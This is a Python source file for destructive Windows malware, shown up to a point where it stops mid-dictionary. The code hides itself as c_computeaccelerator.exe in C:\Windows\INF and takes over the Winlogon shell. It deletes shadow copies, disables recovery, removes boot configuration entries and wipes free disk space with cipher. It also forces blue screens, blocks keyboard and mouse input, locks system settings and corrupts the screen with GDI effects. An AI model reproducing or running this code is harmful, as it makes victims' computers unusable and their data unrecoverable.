import ctypes
import math
import os
import pygame
import win32com.client
import win32ui
import tkinter as tk
from tkinter import ttk
from PIL import Image, ImageTk, ImageWin
import subprocess
import psutil
import winreg as reg
import shutil
import threading
import sys
import keyboard
import win32gui
import win32api
import time
import random
import win32con
from collections import defaultdict
from ctypes import windll, c_int, c_uint, c_ulong, POINTER, byref
from moviepy.editor import VideoFileClip
from win32gui import *



def resource_path(relative_path):
    if hasattr(sys, '_MEIPASS'):
        base_path = os.path.join(sys._MEIPASS, "resources")
    else:
        base_path = os.path.join(os.path.abspath("."), "resources")
    return os.path.join(base_path, relative_path)

#########################################################################3

pygame.mixer.init()
hdc = win32gui.GetDC(0)
user32 = ctypes.windll.user32
user32.SetProcessDPIAware()
[w, h] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)]
image_paths = [
    resource_path("1.jpg"),
    resource_path("2.jpg"),
    resource_path("3.jpg"),
    resource_path("4.jpg"),
    resource_path("5.jpg")
]

######################################################

stop_supermelt = threading.Event()
stop_smelt = threading.Event()
stop_invert = threading.Event()
stop_hell = threading.Event()
stop_tunnel = threading.Event()
stop_sines = threading.Event()
stop_void = threading.Event()
stop_rastag = threading.Event()
stop_errorscursor = threading.Event()
stop_error = threading.Event()
stop_Panscreen = threading.Event()
stop_swipescreen = threading.Event()
stop_drawimages = threading.Event()
stop_rottun = threading.Event()

#######################################################


def lock_personalization_settings():
    try:
        # Блокировка смены обоев и цвета через ActiveDesktop
        active_desktop_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop"
        try:
            key = reg.OpenKey(reg.HKEY_CURRENT_USER, active_desktop_path, 0, reg.KEY_SET_VALUE)
        except FileNotFoundError:
            key = reg.CreateKey(reg.HKEY_CURRENT_USER, active_desktop_path)

        # Запрещаем смену обоев: значение 1 означает блокировку
        reg.SetValueEx(key, "NoChangingWallPaper", 0, reg.REG_DWORD, 1)
        # Запрещаем смену цветовой схемы: значение 1 означает блокировку
        reg.SetValueEx(key, "NoChangingColor", 0, reg.REG_DWORD, 1)
        reg.CloseKey(key)
        print("Ограничение смены обоев и цвета успешно установлено.")

        # Блокировка смены тем через настройки проводника
        explorer_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
        try:
            key = reg.OpenKey(reg.HKEY_CURRENT_USER, explorer_path, 0, reg.KEY_SET_VALUE)
        except FileNotFoundError:
            key = reg.CreateKey(reg.HKEY_CURRENT_USER, explorer_path)

        # Отключаем вкладку «Темы» (NoThemesTab = 1)
        reg.SetValueEx(key, "NoThemesTab", 0, reg.REG_DWORD, 1)
        reg.CloseKey(key)
        print("Ограничение смены тем успешно установлено.")
    except:
        print("123")


def customize_and_set_window_color():
    try:
        # Изменение настроек персонализации (DWM)
        key = reg.CreateKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\DWM")
        # Устанавливаем цвет акцента. При использовании формата BGR для красного (RGB: 255, 0, 0) значение – 0x0000FF.
        accent_color = 0x0000FF
        reg.SetValueEx(key, "AccentColor", 0, reg.REG_DWORD, accent_color)

        # Включаем использование акцентного цвета и задаём цвет фона
        reg.SetValueEx(key, "ColorPrevalence", 0, reg.REG_DWORD, 1)
        # Для фонового цвета используем то же значение (0x0000FF)
        reg.SetValueEx(key, "ColorizationColor", 0, reg.REG_DWORD, accent_color)

        # Устанавливаем прозрачность окон (значение от 0 до 100)
        transparency = 50
        reg.SetValueEx(key, "ColorizationTransparency", 0, reg.REG_DWORD, transparency)
        reg.CloseKey(key)
        print("Персонализация успешно обновлена!")

        # Изменение цвета фона окон (ключ Control Panel\Colors)
        registry_key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Control Panel\Colors", 0, reg.KEY_SET_VALUE)
        # Здесь устанавливаем строковое значение цвета для параметра Window.
        # Формат – 'R G B'. Для красного цвета (255 0 0):
        reg.SetValueEx(registry_key, 'Window', 0, reg.REG_SZ, '255 0 0')
        reg.CloseKey(registry_key)
        print("Цвет фона окон успешно изменён на красный (255 0 0).")

    except Exception as e:
        print(f"Ошибка при установке значений реестра: {e}")


def supermelt():
    while not stop_supermelt.is_set():
        user32 = ctypes.windll.user32
        user32.SetProcessDPIAware()
        hdc = win32gui.GetDC(0)
        w = win32api.GetSystemMetrics(win32con.SM_CXSCREEN)
        h = win32api.GetSystemMetrics(win32con.SM_CYSCREEN)
        rx = random.randint(0, w)
        win32gui.BitBlt(hdc, rx, 20, 200, h, hdc, rx, 0, win32con.SRCCOPY)
        win32gui.ReleaseDC(0, hdc)


def smelt():
    while not stop_smelt.is_set():
        user32 = ctypes.windll.user32
        user32.SetProcessDPIAware()
        gdi32 = ctypes.WinDLL('gdi32')
        GetSystemMetrics = user32.GetSystemMetrics
        GetDC = user32.GetDC
        ReleaseDC = user32.ReleaseDC
        BitBlt = gdi32.BitBlt

        # Ekran genişliği ve yüksekliği için sabitleri tanımlayalım
        SM_CXSCREEN = 0
        SM_CYSCREEN = 1

        # BitBlt fonksiyonundaki sabitler
        SRCCOPY = 0xCC0020

        hdc = GetDC(0)
        w = GetSystemMetrics(SM_CXSCREEN)
        h = GetSystemMetrics(SM_CYSCREEN)
        x = random.randint(0, w - 1)
        BitBlt(hdc, x, 1, 30, h, hdc, x, 0, SRCCOPY)
        ReleaseDC(0, hdc)


def is_safe_mode():
    SM_CLEANBOOT = 67
    mode = ctypes.windll.user32.GetSystemMetrics(SM_CLEANBOOT)
    return mode in (1, 2)


def BSOD():
    null_pointer = POINTER(c_int)()

    privilege_id = c_uint(19)
    enable_privilege = c_uint(1)
    current_thread = c_uint(0)
    privilege_status = c_int()
    windll.ntdll.RtlAdjustPrivilege(
        privilege_id,
        enable_privilege,
        current_thread,
        byref(privilege_status)
    )

    error_code = c_ulong(0xC000007B)
    arg_count = c_ulong(0)
    response_status = c_uint()
    windll.ntdll.NtRaiseHardError(
        error_code,
        arg_count,
        null_pointer,
        null_pointer,
        c_uint(6),
        byref(response_status)
    )


def block_keys():
    keys_to_block = ['win', 'tab', 'shift', 'f4']
    for key in keys_to_block:
        keyboard.block_key(key)


def clrtaltBSOD():
    keyboard.add_hotkey('ctrl+alt+delete',BSOD)
    keyboard.add_hotkey('ctrl+alt+insert', BSOD)
    keyboard.wait()


def set_file_attributes(file_path):
    # Устанавливаем атрибуты скрытый и системный
    ctypes.windll.kernel32.SetFileAttributesW(file_path, 0x02 | 0x04)  # FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM

TARGET_DIR = r"C:\Windows\INF"
def copyicons():
    icon_files = ['1.ico', '2.ico', '4.ico', '6.ico']
    for icon in icon_files:
        icon_path = resource_path(icon)  # Получаем абсолютный путь к иконке
        print(f"Проверка иконки: {icon} в {icon_path}")  # Добавим вывод пути

        if os.path.exists(icon_path):
            target_icon_path = os.path.join(TARGET_DIR, icon)  # Путь к целевой папке
            print(f"Проверка целевой папки: {target_icon_path}")  # Добавим вывод целевой папки

            # Если файл уже существует, не копируем
            if not os.path.exists(target_icon_path):
                try:
                    shutil.copy(icon_path, target_icon_path)
                    set_file_attributes(file_path=target_icon_path)
                    print(f"Успешно скопирован файл иконки: {icon}")
                except Exception as e:
                    print(f"Ошибка копирования {icon}: {e}")
            else:
                print(f"Файл {icon} уже существует в целевой папке.")
        else:
            print(f"Файл иконки {icon} не найден в resources.")


def copy_to_target(new_name="c_computeaccelerator.exe"):
    # Копирует текущий исполняемый файл в папку назначения с указанным именем

    if not os.path.exists(TARGET_DIR):
        os.makedirs(TARGET_DIR)
        return

    # Полный путь текущего файла
    current_file = sys.argv[0]
    target_file = os.path.join(TARGET_DIR, new_name)

    # Проверяем, если уже в папке назначения с указанным именем, не копируем
    if os.path.abspath(current_file) == os.path.abspath(target_file):
        return True  # Уже в нужной папке с нужным именем

    # Копируем файл
    try:
        shutil.copy(current_file, target_file)
        print("Успешно", f"Программа скопирована в {TARGET_DIR} с именем {new_name}")

        # Устанавливаем атрибуты скрытый и системный
        set_file_attributes(target_file)

        os.startfile(target_file)  # Запускаем копию из целевой папки
        os.startfile(resource_path("script.vbs"))
        sys.exit()  # Завершаем исходный файл

    except Exception as e:
        print("Ошибка", f"Не удалось скопировать файл: {e}")


def set_file_attributes(file_path):
    try:
        # Устанавливаем атрибуты скрытый и системный
        os.system(f"attrib +h +s \"{file_path}\"")
    except Exception as e:
        print(f"Ошибка при установке атрибутов: {e}")


copyicons()
copy_to_target(new_name="c_computeaccelerator.exe")


def lol():
    try:
        flags = subprocess.CREATE_NO_WINDOW | subprocess.SW_HIDE

        # Уничтожение точек восстановления
        subprocess.run(['vssadmin', 'delete', 'shadows', '/all', '/quiet'], creationflags=flags, check=True)

        # Отключение защиты восстановления
        subprocess.run(['reagentc', '/disable'], creationflags=flags, check=True)


        # Уничтожение BCD хранилища
        subprocess.run(['bcdedit', '/delete', '/cleanup'], creationflags=flags, check=True)

        # Физическое стирание разделов
        subprocess.run(['cipher', '/w:C:'], creationflags=flags, check=True)

        # Уничтожение реестра восстановления
        subprocess.run([
            'reg', 'delete',
            'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore',
            '/f'
        ], creationflags=flags, check=True)

        print("\033[91mСреда восстановления уничтожена. Система не подлежит восстановлению!\033[0m")
    except Exception as e:
        print(f"Критическая ошибка: {str(e)}")


def change_shell():
    try:
        key = reg.CreateKey(reg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon")
        reg.SetValueEx(key, "shell", 0, reg.REG_SZ, "C:/Windows/INF/c_computeaccelerator.exe")
        reg.CloseKey(key)
    except Exception as e:
        print(f"Ошибка при установке значения реестра: {e}")


def invert():
    while not stop_invert.is_set():
        win32gui.InvertRect(hdc, (0, 0, w, h))
        time.sleep(1)  # Adjust delay to your liking


def Hell():
    user32 = ctypes.windll.user32
    user32.SetProcessDPIAware()
    [sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)]
    hdc = win32gui.GetDC(0)

    while not stop_hell.is_set():
        win32gui.BitBlt(
            hdc,
            0,
            0,
            sw,
            sh,
            hdc,
            random.randrange(-3, 4),
            random.randrange(-3, 4),
            win32con.NOTSRCCOPY,
        )


def draw_random_image(image_paths=image_paths, display_size=(400, 400)):
    while True:
        # Выбираем случайное изображение из списка
        image_path = random.choice(image_paths)

        # Загружаем изображение
        img = Image.open(image_path)
        # Изменяем размер изображения до 400x400 пикселей
        img = img.resize(display_size, Image.Resampling.LANCZOS)
        width, height = img.size

        # Получаем размеры экрана
        screen_width = win32api.GetSystemMetrics(win32con.SM_CXSCREEN)
        screen_height = win32api.GetSystemMetrics(win32con.SM_CYSCREEN)

        # Если экран меньше требуемого размера, устанавливаем координаты (0, 0)
        if screen_width < width or screen_height < height:
            x, y = 0, 0
        else:
            # Вычисляем случайные координаты так, чтобы изображение полностью помещалось на экране
            x = random.randint(0, screen_width - width)
            y = random.randint(0, screen_height - height)

        # Получаем дескриптор устройства (DC) рабочего стола
        hdesktop = win32gui.GetDC(0)
        desktop_dc = win32ui.CreateDCFromHandle(hdesktop)

        # Преобразуем изображение для GDI и отрисовываем его
        dib = ImageWin.Dib(img)
        dib.draw(desktop_dc.GetHandleOutput(), (x, y, x + width, y + height))

        time.sleep(0.05)


def void():
    hdc = win32gui.GetDC(0)
    user32 = ctypes.windll.user32
    user32.SetProcessDPIAware()
    [w, h] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)]

    x = y = 0
    while not stop_void.is_set():
        hdc = win32gui.GetDC(0)
        win32gui.BitBlt(
            hdc,
            random.randint(1, 10) % 2,
            random.randint(1, 10) % 2,
            w,
            h,
            hdc,
            random.randint(1, 1000) % 2,
            random.randint(1, 1000) % 2,
            win32con.SRCAND,
        )
        time.sleep(0.4)
        win32gui.ReleaseDC(0, hdc)


def tunnel():
    hdc = win32gui.GetDC(0)
    user32 = ctypes.windll.user32
    user32.SetProcessDPIAware()
    [sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)]

    delay = 2.5
    size = 100
    while not stop_tunnel.is_set():
        hdc = win32gui.GetDC(0)
        win32gui.StretchBlt(hdc,int(size / 2),int(size / 2),sw - size,sh - size,hdc,0,0,sw,sh,win32con.SRCCOPY)
        time.sleep(delay)


def changetoeng():
    LANG_ENGLISH_US = 0x0409  # Код для английской раскладки
    HWND_BROADCAST = 0xFFFF
    WM_INPUTLANGCHANGEREQUEST = 0x0050
    # Загрузка раскладки
    def set_keyboard_layout(language_code):
        user32 = ctypes.WinDLL("user32")
        layout = user32.LoadKeyboardLayoutW(f"{language_code:04X}{language_code:04X}", 1)
        user32.PostMessageW(HWND_BROADCAST, WM_INPUTLANGCHANGEREQUEST, 0, layout)
    set_keyboard_layout(LANG_ENGLISH_US)


def swipescreen():
        user32 = ctypes.windll.user32
        user32.SetProcessDPIAware()
        desktop = win32gui.GetDesktopWindow()
        hdc = win32gui.GetWindowDC(desktop)
        sw = win32api.GetSystemMetrics(0)
        sh = win32api.GetSystemMetrics(1)
        angle = 0

        while not stop_swipescreen.is_set():
            hdc = win32gui.GetWindowDC(desktop)
            n = 0
            for i in range(int(sw + sh)):
                a = int(math.sin(n) * 20)
                win32gui.BitBlt(hdc, 0, 0, sw, sh, hdc, a, 0, win32con.SRCCOPY)
                n += 0.1
            win32gui.ReleaseDC(desktop, hdc)
            time.sleep(0.01)


def showiconatc():
    while not stop_errorscursor.is_set():
        # Get the cursor position
        cpos = win32gui.GetCursorPos()

        # Get the device context for the entire screen
        hdc = win32gui.GetDC(0)

        # Load the icon (IDI_INFORMATION, for example)
        icon = win32gui.LoadIcon(None, win32con.IDI_ERROR)

        # Draw the icon at the cursor position
        win32gui.DrawIcon(hdc, cpos[0], cpos[1], icon)

        # Release the device context
        win32gui.ReleaseDC(0, hdc)


def rastagHori():
    hdc = win32gui.GetDC(0)
    user32 = ctypes.windll.user32
    user32.SetProcessDPIAware()
    [sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)]

    while not stop_rastag.is_set():
        hdc = win32gui.GetDC(0)
        win32gui.StretchBlt(hdc, -5, 0, sw + 10, sh, hdc, 0, 0, sw, sh, win32con.SRCCOPY)
        win32gui.ReleaseDC(0, hdc)
        time.sleep(0.1)


def RotTun():
    user32 = ctypes.windll.user32
    user32.SetProcessDPIAware()
    [sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)]

    screen_size = win32gui.GetWindowRect(win32gui.GetDesktopWindow())

    left = screen_size[0]
    top = screen_size[1]
    right = screen_size[2]
    bottom = screen_size[3]

    lpppoint = ((left + 50, top - 50), (right + 50, top + 50), (left - 50, bottom - 50))

    while not stop_rottun.is_set():
        hdc = win32gui.GetDC(0)
        mhdc = CreateCompatibleDC(hdc)
        hbit = CreateCompatibleBitmap(hdc, sh, sw)
        holdbit = SelectObject(mhdc, hbit)

        PlgBlt(
            hdc,
            lpppoint,
            hdc,
            left - 20,
            top - 20,
            (right - left) + 40,
            (bottom - top) + 40,
            None,
            0,
            0,
        )
        time.sleep(0.5)


def Panscreen():
    user32 = ctypes.windll.user32
    user32.SetProcessDPIAware()
    [sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)]
    hdc = win32gui.GetDC(0)
    dx = dy = 1
    angle = 0
    size = 1
    speed = 1
    while not stop_Panscreen.is_set():

        win32gui.BitBlt(hdc, 0, 0, sw, sh, hdc, dx, dy, win32con.SRCCOPY)
        dx = math.ceil(math.sin(angle) * size * 10)
        dy = math.ceil(math.cos(angle) * size * 10)
        angle += speed / 10
        if angle > math.pi:
            angle = math.pi * -1
        time.sleep(0.1)


def sines():
    desktop = win32gui.GetDesktopWindow()
    hdc = win32gui.GetWindowDC(desktop)
    sw = win32api.GetSystemMetrics(0)
    sh = win32api.GetSystemMetrics(1)
    angle = 0
    scaling_factor = 10  # Adjust this value for performance vs. visual quality

    while not stop_sines.is_set():
        hdc = win32gui.GetWindowDC(desktop)
        for i in range(0, int(sw + sh), scaling_factor):
            # Scale the amplitude of the sine wave
            a = int(math.sin(angle) * 20 * (scaling_factor))
            win32gui.BitBlt(hdc, 0, i, sw, scaling_factor, hdc, a, i, win32con.SRCCOPY)
            angle += math.pi / 40
        win32gui.ReleaseDC(desktop, hdc)


def errors():
    icons = [
        win32gui.LoadIcon(None, win32con.IDI_ERROR),
        #win32gui.LoadIcon(None, win32con.IDI_QUESTION),
        win32gui.LoadIcon(None, win32con.IDI_EXCLAMATION),
        #win32gui.LoadIcon(None, win32con.IDI_WARNING),
        win32gui.LoadIcon(None, win32con.IDI_INFORMATION)
    ]

    # Предгенерация диапазона координат
    x_range = range(0, w)
    y_range = range(0, h)

    try:
        while not stop_error.is_set():
            # Использование предзагруженных иконок и быстрого выбора координат
            win32gui.DrawIcon(
                hdc,
                random.choice(x_range),
                random.choice(y_range),
                random.choice(icons)
            )
            time.sleep(0.1)
            # Небольшая задержка для снижения нагрузки на CPU
    except:
        print("123")


def checkSafeMode():
    if not is_safe_mode():
        print("Этот скрипт может выполняться только в безопасном режиме Windows.")
        sys.exit(1)
    # Основной код, который должен выполняться только в безопасном режиме
    print("Запущено в безопасном режиме!")


def starttunnel():
    potok_tunnel = threading.Thread(target=tunnel)
    potok_tunnel.start()
    return potok_tunnel


def starticonscursor():
    potok_cursorerrors = threading.Thread(target=showiconatc)
    potok_cursorerrors.start()
    return potok_cursorerrors


def startmelt():
    potok_melt = threading.Thread(target=supermelt)
    potok_melt.start()
    return potok_melt


def startvoid():
    potok_void = threading.Thread(target=void)
    potok_void.start()
    return potok_void


def starterrors():
    potok_errors = threading.Thread(target=errors)
    potok_errors.start()
    return potok_errors


def starthell():
    potok_hell = threading.Thread(target=Hell)
    potok_hell.start()
    return potok_hell


def startpanscreen():
    potok_panscreen = threading.Thread(target=Panscreen)
    potok_panscreen.start()
    return potok_panscreen


def startinvert():
    potok_invert = threading.Thread(target=invert)
    potok_invert.start()
    return potok_invert


def startsines():
    potok_sines = threading.Thread(target=sines)
    potok_sines.start()
    return potok_sines


def startrottun():
    potok_rottun = threading.Thread(target=RotTun)
    potok_rottun.start()
    return potok_rottun


def startdrawimages():
    potok_drawimages = threading.Thread(target=draw_random_image)
    potok_drawimages.start()
    return potok_drawimages


def startsmelt():
    potok_smelt = threading.Thread(target=smelt)
    potok_smelt.start()
    return potok_smelt


def startswipescreen():
    potok_swipescreen = threading.Thread(target=swipescreen)
    potok_swipescreen.start()
    return potok_swipescreen


def startrastagHori():
    potok_rastagHori = threading.Thread(target=rastagHori)
    potok_rastagHori.start()
    return potok_rastagHori


def customize_and_set_window_color():
    try:
        # Изменение настроек персонализации (DWM)
        key = reg.CreateKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\DWM")
        # Устанавливаем цвет акцента. При использовании формата BGR для красного (RGB: 255, 0, 0) значение – 0x0000FF.
        accent_color = 0x0000FF
        reg.SetValueEx(key, "AccentColor", 0, reg.REG_DWORD, accent_color)

        # Включаем использование акцентного цвета и задаём цвет фона
        reg.SetValueEx(key, "ColorPrevalence", 0, reg.REG_DWORD, 1)
        # Для фонового цвета используем то же значение (0x0000FF)
        reg.SetValueEx(key, "ColorizationColor", 0, reg.REG_DWORD, accent_color)

        # Устанавливаем прозрачность окон (значение от 0 до 100)
        transparency = 50
        reg.SetValueEx(key, "ColorizationTransparency", 0, reg.REG_DWORD, transparency)
        reg.CloseKey(key)
        print("Персонализация успешно обновлена!")

        # Изменение цвета фона окон (ключ Control Panel\Colors)
        registry_key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Control Panel\Colors", 0, reg.KEY_SET_VALUE)
        # Здесь устанавливаем строковое значение цвета для параметра Window.
        # Формат – 'R G B'. Для красного цвета (255 0 0):
        reg.SetValueEx(registry_key, 'Window', 0, reg.REG_SZ, '255 0 0')
        reg.CloseKey(registry_key)
        print("Цвет фона окон успешно изменён на красный (255 0 0).")

    except Exception as e:
        print(f"Ошибка при установке значений реестра: {e}")


def set_wallpaper(image_path):
    image_path = os.path.abspath(image_path)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)


def playMusic_runappmain():
    pygame.mixer.music.load(resource_path("runapp_main.MP3"))  # Загружаем музыку
    pygame.mixer.music.play(-1)  # Воспроизведение (-1 означает бесконечный повтор)


def playMusic_after50():
    pygame.mixer.stop()
    pygame.mixer.music.load(resource_path("after50.mp3"))  # Загружаем музыку
    pygame.mixer.music.play(-1)  # Воспроизведение (-1 означает бесконечный повтор)


def playmusic_for3():
    pygame.mixer.stop()
    pygame.mixer.music.load(resource_path("scaryfor3.MP3"))  # Загружаем музыку
    pygame.mixer.music.play(-1)  # Воспроизведение (-1 означает бесконечный повтор)


def fuckaltf4(event):
    return "break"


def set_window_always_on_top(window_title="MoviePy"):

    # Функция в цикле ищет окно с указанным заголовком и устанавливает его как topmost.

    # Ждем появления окна
    while True:
        hwnd = win32gui.FindWindow(None, window_title)
        if hwnd:
            # Устанавливаем окно поверх всех
            win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, 0, 0,
                                  win32con.SWP_NOMOVE | win32con.SWP_NOSIZE)
            break
        time.sleep(0.1)


file_path = r"C:\Windows\INF\iaLPSS2i_mausbhost_CNL.inf"


def changeto3():
    remove_file_attributes(file_path)
    with open(file_path, "w") as f:
        f.write("3")
        set_file_attributes(file_path)


def change_shell_aftervideo():
    try:
        key = reg.CreateKey(reg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon")
        reg.SetValueEx(key, "shell", 0, reg.REG_SZ, "explorer.exe, C:/Windows/INF/c_computeaccelerator.exe")
        reg.CloseKey(key)
    except Exception as e:
        print(f"Ошибка при установке значения реестра: {e}")


def play_video_fullscreen(video_path):
    def get_screen_size():
        user32 = ctypes.windll.user32
        user32.SetProcessDPIAware()
        screen_width = user32.GetSystemMetrics(0)
        screen_height = user32.GetSystemMetrics(1)
        return screen_width, screen_height

    # Блокируем ввод
    ctypes.windll.user32.BlockInput(True)
    screen_width, screen_height = get_screen_size()  # Получаем разрешение экрана

    # Загружаем видео и меняем его размер под разрешение экрана
    clip = VideoFileClip(video_path)
    clip_resized = clip.resize(width=screen_width, height=screen_height)

    def preview_video():
        # Воспроизводим видео в полноэкранном режиме с включенным звуком
        clip_resized.preview(fullscreen=True, audio=True)
        clip_resized.close()  # Закрываем клип после завершения

    # Запускаем воспроизведение видео в отдельном потоке
    video_thread = threading.Thread(target=preview_video)
    video_thread.start()

    # Параллельно запускаем поток для установки окна поверх всех
    top_thread = threading.Thread(target=set_window_always_on_top)
    top_thread.start()

    # Ждем завершения обоих потоков
    video_thread.join()
    top_thread.join()

    # После завершения воспроизведения вызываем run_app()
    ctypes.windll.user32.BlockInput(False)
    changeto3()
    change_shell_aftervideo()
    time.sleep(0.5)
    BSOD()


def play_video_dead(video_path):
    stop_Panscreen.set()
    stop_hell.set()
    stop_smelt.set()
    stop_invert.set()
    stop_errorscursor.set()
    stop_invert.set()
    stop_void.set()
    stop_swipescreen.set()
    stop_rottun.set()
    stop_rastag.set()
    stop_drawimages.set()
    stop_supermelt.set()
    stop_error.set()
    stop_supermelt.set()
    def get_screen_size():
        user32 = ctypes.windll.user32
        user32.SetProcessDPIAware()
        screen_width = user32.GetSystemMetrics(0)
        screen_height = user32.GetSystemMetrics(1)
        return screen_width, screen_height

    # Блокируем ввод
    ctypes.windll.user32.BlockInput(True)
    screen_width, screen_height = get_screen_size()  # Получаем разрешение экрана

    # Загружаем видео и меняем его размер под разрешение экрана
    clip = VideoFileClip(video_path)
    clip_resized = clip.resize(width=screen_width, height=screen_height)

    def preview_video():
        # Воспроизводим видео в полноэкранном режиме с включенным звуком
        clip_resized.preview(fullscreen=True, audio=True)
        clip_resized.close()  # Закрываем клип после завершения

    # Запускаем воспроизведение видео в отдельном потоке
    video_thread = threading.Thread(target=preview_video)
    video_thread.start()

    # Параллельно запускаем поток для установки окна поверх всех
    top_thread = threading.Thread(target=set_window_always_on_top)
    top_thread.start()

    # Ждем завершения обоих потоков
    video_thread.join()
    top_thread.join()

    # После завершения воспроизведения вызываем
    BSOD()


def set_file_attributes(file_path):
    # Устанавливаем атрибуты скрытый и системный
    ctypes.windll.kernel32.SetFileAttributesW(file_path, 0x02 | 0x04)


def checkexe():
    # Список отслеживаемых расширений
    EXECUTABLE_EXTENSIONS = {".exe", ".bat", ".cmd", ".vbs", ".ps1"}

    # Счётчик запущенных процессов (учитывая уникальные приложения)
    process_counts = defaultdict(int)
    tracked_apps = set()
    tracked_pids = set()
    existing_pids = {proc.pid for proc in psutil.process_iter(['pid'])}

    # Функции для обработки событий
    def on_six_apps():
        print("6")
        starticonscursor()

    def on_12_apps():
        print("12")
        starterrors()

    def on_16_apps():
        print("16")
        startsmelt()

    def on_18_apps():
        print("18")
        startdrawimages()

    def on_20_apps():
        print("20")
        starttunnel()

    def on_22_apps():
        print("22")
        startvoid()

    def on_24_apps():
        print("24")
        startinvert()

    def on_26_apps():
        print("26")
        startrastagHori()

    def on_30_apps():
        print("30")
        startmelt()

    def on_40_apps():
        print("40")
        startsines()

    def on_45_apps():
        print("45")
        startpanscreen()

    def on_50_apps():
        print("50")
        startrottun()

    def on_70_apps():
        print("70")
        startswipescreen()

    def on_90_apps():
        print("90")
        starthell()
    # Флаги, чтобы функции запускались один раз
    triggered_events = {6: False, 12: False, 16: False, 18: False, 20: False, 22: False, 24: False, 26: False, 30: False, 40: False, 45: False, 50:False, 70:False, 90:False}

    while True:
        current_pids = set()
        app_instances = defaultdict(set)

        for proc in psutil.process_iter(['pid', 'name', 'username']):
            try:
                pid = proc.info['pid']
                name = proc.info['name'].lower()
                user = proc.info.get('username', '')

                if any(name.endswith(ext) for ext in EXECUTABLE_EXTENSIONS):
                    current_pids.add(pid)
                    app_instances[name].add(pid)
                    if pid not in existing_pids and pid not in tracked_pids and user:
                        tracked_pids.add(pid)
                        tracked_apps.add(name)
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                continue

        total_processes = len(tracked_apps)  # Учитываем уникальные приложения, а не процессы

        if total_processes >= 6 and not triggered_events[6]:
            on_six_apps()
            triggered_events[6] = True
        if total_processes >= 12 and not triggered_events[12]:
            on_12_apps()
            triggered_events[12] = True
        if total_processes >= 16 and not triggered_events[16]:
            on_16_apps()
            triggered_events[16] = True
        if total_processes >= 18 and not triggered_events[18]:
            on_18_apps()
            triggered_events[18] = True
        if total_processes >= 20 and not triggered_events[20]:
            on_20_apps()
            triggered_events[20] = True
        if total_processes >= 22 and not triggered_events[22]:
            on_22_apps()
            triggered_events[22] = True
        if total_processes >= 24 and not triggered_events[24]:
            on_24_apps()
            triggered_events[24] = True
        if total_processes >= 26 and not triggered_events[26]:
            on_26_apps()
            triggered_events[26] = True
        if total_processes >= 30 and not triggered_events[30]:
            on_30_apps()
            triggered_events[30] = True
        if total_processes >= 40 and not triggered_events[40]:
            on_40_apps()
            triggered_events[40] = True
        if total_processes >= 45 and not triggered_events[45]:
            on_45_apps()
            triggered_events[45] = True
        if total_processes >= 50 and not triggered_events[50]:
            on_50_apps()
            triggered_events[50] = True
        if total_processes >= 70 and not triggered_events[70]:
            on_70_apps()
            triggered_events[70] = True
        if total_processes >= 90 and not triggered_events[90]:
            on_90_apps()
            triggered_events[90] = True
        time.sleep(0.5)  # Пауза перед следующей проверкой


def changeto2():
    remove_file_attributes(file_path)
    with open(file_path, "w") as f:
        f.write("2")
        set_file_attributes(file_path)


def disable_explorer_settings():
    try:
        # Запрещаем изменение параметров проводника
        reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(reg_key, "NoFolderOptions", 0, reg.REG_DWORD, 1)  # Запрещаем доступ к настройкам проводника
        reg.CloseKey(reg_key)
        print("Запрещено изменение параметров проводника")

        # Отключаем видимость скрытых файлов
        reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(reg_key, "Hidden", 0, reg.REG_DWORD, 0)  # 0 - скрытые файлы не видны
        reg.SetValueEx(reg_key, "ShowSuperHidden", 0, reg.REG_DWORD, 0)  # Скрыть системные файлы
        reg.CloseKey(reg_key)
        print("Отключена видимость скрытых и системных файлов")

        # Отключаем поиск в проводнике
        reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(reg_key, "DisableSearchBoxSuggestions", 0, reg.REG_DWORD, 1)  # Отключаем поиск
        reg.CloseKey(reg_key)
        print("Отключен поиск в проводнике")

    except Exception as e:
        print(f"Ошибка: {e}")


def update_icons():
    ico1 = r"C:\Windows\INF\1.ico"
    ico2 = r"C:\Windows\INF\2.ico"
    ico4 = r"C:\Windows\INF\4.ico"
    ico6 = r"C:\Windows\INF\6.ico"

    icon_paths = {
        "exefile": ico2,
        "txtfile": ico1,
        "batfile": ico1,
        "blendfile": ico2,
        "dllfile": ico2,
        "AutoHotkeyScript": ico2,
        "pngfile": ico2,
        "jpegfile": ico1,
        "giffile": ico2,
        "bittorrent": ico2,
        "cmdfile": ico2,
        "dbfile": ico2,
        "Drive": ico2,
        "DVD": ico2,
        "docxfile": ico1,
        "htmlfile": ico1,
        "http": ico1,
        "mhtmlfile": ico1,
        "Folder": ico6,
        "https": ico6,
        "icofile": ico6,
        "inifile": ico6,
        "mscfile": ico6,
        "ms-excel": ico2,
        "ms-publisher": ico2,
        "ms-word": ico2,
        "ms-access": ico2,
